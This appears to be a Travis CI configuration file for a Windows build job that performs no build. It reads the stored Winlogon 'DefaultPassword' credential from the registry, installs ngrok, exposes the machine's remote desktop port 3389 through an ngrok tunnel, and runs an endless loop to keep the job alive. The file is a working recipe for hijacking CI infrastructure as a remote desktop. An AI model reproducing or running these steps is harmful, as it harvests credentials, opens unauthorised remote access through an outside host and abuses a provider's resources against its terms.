os: windows
language: bash
before_install:
- powershell '[Microsoft.Win32.Registry]::GetValue("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultPassword", "")'
install:
- choco install -y ngrok
- ngrok authtoken $NG
- ngrok tcp 3389 > /dev/null &
- while true; do echo 'LOL' && sleep 540; done
